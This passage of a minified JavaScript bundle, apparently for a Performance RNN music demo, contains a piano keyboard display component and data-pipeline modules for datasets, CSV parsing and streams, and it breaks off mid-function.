!function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).performance_rnn=t()}}((function(){return function t(e,n,r){function i(s,a){if(!n[s]){if(!e[s]){var u="function"==typeof require&&require;if(!a&&u)return u(s,!0);if(o)return o(s,!0);var c=new Error("Cannot find module '"+s+"'");throw c.code="MODULE_NOT_FOUND",c}var l=n[s]={exports:{}};e[s][0].call(l.exports,(function(t){return i(e[s][1][t]||t)}),l,l.exports,t,e,n,r)}return n[s].exports}for(var o="function"==typeof require&&require,s=0;s<r.length;s++)i(r[s]);return i}({1:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=[0,.5,1,1.5,2,3,3.5,4,4.5,5,5.5,6],i=function(){function t(t){this.container=t,this.keys={},this.resize(),this.notes={}}return t.prototype.resize=function(){this.keys={},this.container.innerHTML="";for(var t=1/52,e=21;e<=108;e++){var n=document.createElement("div");n.classList.add("key");var i=-1!==[1,3,6,8,10].indexOf(e%12);n.classList.add(i?"black":"white"),this.container.appendChild(n);var o=Math.floor(e/12)-Math.floor(1.75),s=r[e%12]+7*o-5;n.style.width=100*t+"%",n.style.left=s*t*100+"%",n.id=e.toString();var a=document.createElement("div");a.classList.add("fill"),n.appendChild(a),this.keys[e]=n}},t.prototype.keyDown=function(t){if(t in this.keys){var e=this.keys[t],n=new o(e.querySelector(".fill"));this.notes[t]||(this.notes[t]=[]),this.notes[t].push(n)}},t.prototype.keyUp=function(t){t in this.keys&&(this.notes[t]&&this.notes[t].length?this.notes[t].shift().noteOff():console.warn("note off before note on"))},t}();n.KeyboardElement=i;var o=function(){function t(t){this.element=t,this.element.classList.add("active")}return t.prototype.noteOff=function(){this.element.classList.remove("active")},t}()},{}],2:[function(t,e,n){},{}],3:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("./doc"),o=function(){function t(){}return t.nextFrame=function(){return new Promise((function(t){return requestAnimationFrame((function(){return t()}))}))},r([i.doc({heading:"Performance",subheading:"Timing"})],t,"nextFrame",null),t}();n.BrowserUtil=o},{"./doc":25}],4:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../globals"),s=t("../../tensor"),a=t("../../util"),u=function(){function t(t,e,n){void 0===n&&(n=!0),this.base=t,this.batchSize=e,this.smallLastBatch=n}return t.prototype.getStream=function(){return r(this,void 0,void 0,(function(){return i(this,(function(t){return[2,this.base.getStream().batch(this.batchSize,this.smallLastBatch).map(c)]}))}))},t}();function c(t){var e={},n=t[0],r=Object.keys(n);r.forEach((function(t){e[t]=[]}));for(var i=function(t){r.forEach((function(n){var r=t[n];e[n].push(r)}))},u=0,c=t;u<c.length;u++){i(c[u])}var h={};return r.forEach((function(n){if(e[n].length!==t.length)throw new Error("Batching failed to get a '"+n+"' value for each element.");"string"==typeof e[n][0]?h[n]=e[n]:h[n]=function(t){for(var e=l(t[0])[0],n=[t.length].concat(e),r=new Float32Array(n.reduce((function(t,e){return t*e}))),i=0,o=0,u=t;o<u.length;o++){var c=l(u[o]),h=c[0],p=c[1];if(!a.arraysEqual(h,e))throw new Error("Elements must have the same shape to be batched");r.set(p,i),i+=p.length}return s.Tensor.make(n,{values:r})}(e[n])})),t.forEach(o.dispose),h}function l(t){return t instanceof s.Tensor?[t.shape,t.dataSync()]:Array.isArray(t)?[[t.length],t]:[[],[t]]}n.BatchDataset=u},{"../../globals":28,"../../tensor":137,"../../util":143}],5:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("seedrandom"),u=t("../../globals"),c=t("./batch_dataset"),l=t("./statistics"),h=t("./streams/data_stream"),p=t("./streams/data_stream"),d=t("./streams/data_stream"),f=function(){function t(){}return t.prototype.computeStatistics=function(t,e){return o(this,void 0,void 0,(function(){return s(this,(function(n){return[2,l.computeDatasetStatistics(this,t,e)]}))}))},t.prototype.filter=function(t){var e=this;return y((function(){return e.getStream().filter((function(e){return u.tidy((function(){return t(e)}))}))}))},t.prototype.map=function(t){var e=this;return y((function(){return e.getStream().map((function(e){return u.tidy((function(){return t(e)}))}))}))},t.prototype.batch=function(t,e){return void 0===e&&(e=!0),new c.BatchDataset(this,t,e)},t.prototype.concatenate=function(t){var e=this;return y((function(){return e.getStream().concatenate(t.getStream())}))},t.prototype.repeat=function(t){var e=this;return y((function(){var n=h.streamFromFunction((function(){return{value:e.getStream(),done:!1}}));return p.streamFromConcatenated(n.take(t))}))},t.prototype.take=function(t){var e=this;return y((function(){return e.getStream().take(t)}))},t.prototype.skip=function(t){var e=this;return y((function(){return e.getStream().skip(t)}))},t.prototype.shuffle=function(t,e,n){void 0===n&&(n=!0);var r=this,i=a(e);return y((function(){var e=i.int32();return n&&(e+=i.int32()),r.getStream().shuffle(t,e.toString())}))},t.prototype.prefetch=function(t){var e=this;return y((function(){return e.getStream().prefetch(t)}))},t.prototype.collectAll=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return[2,this.getStream().collectRemaining()]}))}))},t.prototype.forEach=function(t){return o(this,void 0,void 0,(function(){return s(this,(function(e){return[2,this.getStream().forEach(t)]}))}))},t}();function y(t){return new(function(e){function n(){return null!==e&&e.apply(this,arguments)||this}return i(n,e),n.prototype.getStream=function(){return t()},n}(f))}n.Dataset=f,n.datasetFromStreamFn=y,n.datasetFromElements=function(t){return y((function(){return d.streamFromItems(t)}))}},{"../../globals":28,"./batch_dataset":4,"./statistics":11,"./streams/data_stream":13,seedrandom:146}],6:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a,u=t("../dataset"),c=t("./text_line_dataset");!function(t){t[t.READ_FIRST_LINE=0]="READ_FIRST_LINE",t[t.NUMBERED=1]="NUMBERED"}(a=n.CsvHeaderConfig||(n.CsvHeaderConfig={}));var l=function(t){function e(n){var r=t.call(this)||this;return r.input=n,r.hasHeaderLine=!1,r.base=new c.TextLineDataset(n,e.textColumnName),r}return i(e,t),Object.defineProperty(e.prototype,"csvColumnNames",{get:function(){return this._csvColumnNames},enumerable:!0,configurable:!0}),e.prototype.setCsvColumnNames=function(t){return o(this,void 0,void 0,(function(){var n,r;return s(this,(function(i){switch(i.label){case 0:return null!=t&&t!==a.NUMBERED?[3,2]:[4,this.base.getStream().next()];case 1:if((n=i.sent()).done)throw new Error("No data was found for CSV parsing.");return r=n.value[e.textColumnName],this._csvColumnNames=Array.from(r.split(",").keys()).map((function(t){return t.toString()})),[3,5];case 2:return t!==a.READ_FIRST_LINE?[3,4]:[4,this.base.getStream().next()];case 3:if((n=i.sent()).done)throw new Error("No data was found for CSV parsing.");return r=n.value[e.textColumnName],this._csvColumnNames=r.split(","),this.hasHeaderLine=!0,[3,5];case 4:this._csvColumnNames=t,i.label=5;case 5:return[2]}}))}))},e.create=function(t,n){return void 0===n&&(n=a.NUMBERED),o(this,void 0,void 0,(function(){var r;return s(this,(function(i){switch(i.label){case 0:return[4,(r=new e(t)).setCsvColumnNames(n)];case 1:return i.sent(),[2,r]}}))}))},e.prototype.getStream=function(){var t=this,e=this.base.getStream();return this.hasHeaderLine&&(e=e.skip(1)),e.map((function(e){return t.makeDatasetElement(e)}))},e.prototype.makeDatasetElement=function(t){for(var n=t[e.textColumnName].split(","),r={},i=0;i<this._csvColumnNames.length;i++){var o=n[i];if(""===o)r[this._csvColumnNames[i]]=void 0;else{var s=Number(o);isNaN(s)?r[this._csvColumnNames[i]]=o:r[this._csvColumnNames[i]]=s}}return r},e.textColumnName="line",e}(u.Dataset);n.CSVDataset=l},{"../dataset":5,"./text_line_dataset":7}],7:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=function(t){function e(e,n){void 0===n&&(n="line");var r=t.call(this)||this;return r.input=e,r.columnName=n,r}return i(e,t),e.prototype.getStream=function(){var t=this;return this.input.getStream().decodeUTF8().split("\n").map((function(e){return(n={})[t.columnName]=e,n;var n}))},e}(t("../dataset").Dataset);n.TextLineDataset=o},{"../dataset":5}],8:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=function(){};n.DataSource=r},{}],9:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../datasource"),s=t("../streams/filereader_stream"),a=function(t){function e(e,n){void 0===n&&(n={});var r=t.call(this)||this;return r.input=e,r.options=n,r}return i(e,t),e.prototype.getStream=function(){return new s.FileReaderStream(this.input,this.options)},e}(o.DataSource);n.FileDataSource=a},{"../datasource":8,"../streams/filereader_stream":14}],10:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../datasource"),s=t("../streams/url_stream"),a=function(t){function e(e,n){void 0===n&&(n={});var r=t.call(this)||this;return r.url=e,r.options=n,r}return i(e,t),e.prototype.getStream=function(){return new s.URLStream(this.url,this.options)},e}(o.DataSource);n.URLDataSource=a},{"../datasource":8,"../streams/url_stream":16}],11:[function(t,e,n){"use strict";var r=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},i=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var o=t("../../tensor");n.scaleTo01=function(t,e){var n=e-t,r=o.Scalar.new(t),i=o.Scalar.new(n);return function(e){if("string"==typeof e)throw new Error("Can't scale a string.");return e instanceof o.Tensor?e.sub(r).div(i):e instanceof Array?e.map((function(e){return(e-t)/n})):(e-t)/n}},n.computeDatasetStatistics=function(t,e,n){return r(this,void 0,void 0,(function(){var r,s;return i(this,(function(i){switch(i.label){case 0:return r=t,null!=n&&(r=r.shuffle(n)),null!=e&&(r=r.take(e)),s={},[4,r.forEach((function(t){for(var e in t){var n=t[e];if("string"==typeof n);else{var r=void 0,i=void 0;if(n instanceof o.Tensor)r=n.min().dataSync()[0],i=n.max().dataSync()[0];else if(n instanceof Array)r=n.reduce((function(t,e){return Math.min(t,e)})),i=n.reduce((function(t,e){return Math.max(t,e)}));else{if(isNaN(n)||!isFinite(n))throw new Error("Cannot compute statistics: "+e+" = "+n);r=n,i=n}var a=s[e];null==a&&(a={min:Number.POSITIVE_INFINITY,max:Number.NEGATIVE_INFINITY},s[e]=a),a.min=Math.min(a.min,r),a.max=Math.max(a.max,i)}}}))];case 1:return i.sent(),[2,s]}}))}))}},{"../../tensor":137}],12:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("utf8"),u=t("./data_stream"),c=t("./string_stream"),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return i(e,t),e.prototype.decodeUTF8=function(){return new h(this)},e}(u.DataStream);n.ByteStream=l;var h=function(t){function e(e){var n=t.call(this)||this;return n.impl=new p(e),n}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return[2,this.impl.next()]}))}))},e}(c.StringStream),p=function(t){function e(e){var n=t.call(this)||this;return n.upstream=e,n.partial=new Uint8Array([]),n.partialBytesValid=0,n}return i(e,t),e.prototype.pump=function(){return o(this,void 0,void 0,(function(){var t,e,n,r,i,o,u,c;return s(this,(function(s){switch(s.label){case 0:return[4,this.upstream.next()];case 1:if((t=s.sent()).done){if(0===this.partial.length)return[2,!1];e=new Uint8Array([])}else e=t.value;for(n=this.partial.length-this.partialBytesValid,i=r=n,o=0;r<e.length;)i=r,o=d(e[r]),r=i+o;return r===e.length&&(i=r),u=a.decode(String.fromCharCode.apply(null,e.slice(n,i))),n>0?(this.partial.set(e.slice(0,n),this.partialBytesValid),c=a.decode(String.fromCharCode.apply(null,this.partial)),this.outputQueue.push(c+u)):this.outputQueue.push(u),i===e.length?(this.partial=new Uint8Array([]),this.partialBytesValid=0):(this.partial=new Uint8Array(new ArrayBuffer(o)),this.partial.set(e.slice(i),0),this.partialBytesValid=e.length-i),[2,!0]}}))}))},e}(u.QueueStream);function d(t){return t>=252?6:t>=248?5:t>=240?4:t>=224?3:t>=192?2:1}},{"./data_stream":13,"./string_stream":15,utf8:156}],13:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("seedrandom"),u=t("../../../globals"),c=t("../../../util"),l=t("../util/growing_ring_buffer"),h=t("../util/ring_buffer");function p(t){return new m(t)}function d(t){return new v(t)}function f(t){return S.create(t)}n.streamFromItems=p,n.streamFromIncrementing=function(t){var e=t;return d((function(){return{value:e++,done:!1}}))},n.streamFromFunction=d,n.streamFromConcatenated=f,n.streamFromConcatenatedFunction=function(t,e){return f(d(t).take(e))};var y=function(){function t(){}return t.prototype.collectRemaining=function(){return o(this,void 0,void 0,(function(){var t,e;return s(this,(function(n){switch(n.label){case 0:return t=[],[4,this.next()];case 1:e=n.sent(),n.label=2;case 2:return e.done?[3,4]:(t.push(e.value),[4,this.next()]);case 3:return e=n.sent(),[3,2];case 4:return[2,t]}}))}))},t.prototype.resolveFully=function(){return o(this,void 0,void 0,(function(){var t;return s(this,(function(e){switch(e.label){case 0:return[4,this.next()];case 1:t=e.sent(),e.label=2;case 2:return t.done?[3,4]:[4,this.next()];case 3:return t=e.sent(),[3,2];case 4:return[2]}}))}))},t.prototype.filter=function(t){return new x(this,t)},t.prototype.map=function(t){return new T(this,t)},t.prototype.forEach=function(t){return o(this,void 0,void 0,(function(){return s(this,(function(e){return[2,this.map(t).resolveFully()]}))}))},t.prototype.batch=function(t,e){return void 0===e&&(e=!0),new w(this,t,e)},t.prototype.concatenate=function(t){return S.create(p([this,t]))},t.prototype.take=function(t){return t<0||null==t?this:new _(this,t)},t.prototype.skip=function(t){return t<0||null==t?this:new g(this,t)},t.prototype.prefetch=function(t){return new O(this,t)},t.prototype.shuffle=function(t,e){return new E(this,t,e)},t}();n.DataStream=y;var m=function(t){function e(e){var n=t.call(this)||this;return n.items=e,n.trav=0,n}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){var t;return s(this,(function(e){return this.trav>=this.items.length?[2,{value:null,done:!0}]:(t=this.items[this.trav],this.trav++,[2,{value:t,done:!1}])}))}))},e}(y),v=function(t){function e(e){var n=t.call(this)||this;return n.nextFn=e,n}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return[2,this.nextFn()]}))}))},e}(y),g=function(t){function e(e,n){var r=t.call(this)||this;return r.upstream=e,r.maxCount=n,r.count=0,r}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){var t;return s(this,(function(e){switch(e.label){case 0:return this.count++<this.maxCount?[4,this.upstream.next()]:[3,2];case 1:return(t=e.sent()).done?[2,t]:(u.dispose(t.value),[3,0]);case 2:return[2,this.upstream.next()]}}))}))},e}(y),_=function(t){function e(e,n){var r=t.call(this)||this;return r.upstream=e,r.maxCount=n,r.count=0,r}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return this.count++>=this.maxCount?[2,{value:null,done:!0}]:[2,this.upstream.next()]}))}))},e}(y),b=function(t){function e(){var e=t.call(this)||this;return e.outputQueue=new l.GrowingRingBuffer,e}return i(e,t),e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){switch(t.label){case 0:return 0!==this.outputQueue.length()?[3,2]:[4,this.pump()];case 1:return t.sent()?[3,0]:[2,{value:null,done:!0}];case 2:return[2,{value:this.outputQueue.shift(),done:!1}]}}))}))},e}(y);n.QueueStream=b;var w=function(t){function e(e,n,r){void 0===r&&(r=!0);var i=t.call(this)||this;return i.upstream=e,i.batchSize=n,i.enableSmallLastBatch=r,i.currentBatch=[],i}return i(e,t),e.prototype.pump=function(){return o(this,void 0,void 0,(function(){var t;return s(this,(function(e){switch(e.label){case 0:return[4,this.upstream.next()];case 1:return(t=e.sent()).done?this.enableSmallLastBatch&&this.currentBatch.length>0?(this.outputQueue.push(this.currentBatch),this.currentBatch=[],[2,!0]):[2,!1]:(this.currentBatch.push(t.value),this.currentBatch.length===this.batchSize&&(this.outputQueue.push(this.currentBatch),this.currentBatch=[]),[2,!0])}}))}))},e}(b),x=function(t){function e(e,n){var r=t.call(this)||this;return r.upstream=e,r.predicate=n,r}return i(e,t),e.prototype.pump=function(){return o(this,void 0,void 0,(function(){var t;return s(this,(function(e){switch(e.label){case 0:return[4,this.upstream.next()];case 1:return(t=e.sent()).done?[2,!1]:(this.predicate(t.value)?this.outputQueue.push(t.value):u.dispose(t.value),[2,!0])}}))}))},e}(b),T=function(t){function e(e,n){var r=t.call(this)||this;return r.upstream=e,r.transform=n,r}return i(e,t),e.prototype.pump=function(){return o(this,void 0,void 0,(function(){var t,e,n,r,i,o,a;return s(this,(function(s){switch(s.label){case 0:return[4,this.upstream.next()];case 1:if((t=s.sent()).done)return[2,!1];for(e=c.extractTensorsFromAny(t.value),n=this.transform(t.value),r=c.extractTensorsFromAny(n),i=0,o=e;i<o.length;i++)a=o[i],c.isTensorInList(a,r)||a.dispose();return this.outputQueue.push(n),[2,!0]}}))}))},e}(b),S=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.stream=null,e.lastRead=null,e}return i(e,t),e.create=function(t){var n=new e;return n.moreStreams=t,n},e.prototype.next=function(){return o(this,void 0,void 0,(function(){return s(this,(function(t){return this.lastRead=this.readFromChain(this.lastRead),[2,this.lastRead]}))}))},e.prototype.readFromChain=function(t){return o(this,void 0,void 0,(function(){var e,n;return s(this,(function(r){switch(r.label){case 0:return[4,t];case 1:return r.sent(),null!=this.stream?[3,3]:[4,this.moreStreams.next()];case 2:if((e=r.sent()).done)return[2,{value:null,done:!0}];this.stream=e.value,r.label=3;case 3:return[4,this.stream.next()];case 4:return(n=r.sent()).done?(this.stream=null,[2,this.readFromChain(t)]):[2,n]}}))}))},e}(y);n.ChainedStream=S;var O=function(t){function e(e,n){var r=t.call(this)||this;return r.upstream=e,r.bufferSize=n,r.total=0,r.buffer=new h.RingBuffer(n),r}return i(e,t),e.prototype.refill=function(){for(;!this.buffer.isFull();){var t=this.upstream.next();this.buffer.push(t)}},e.prototype.next=function(){return 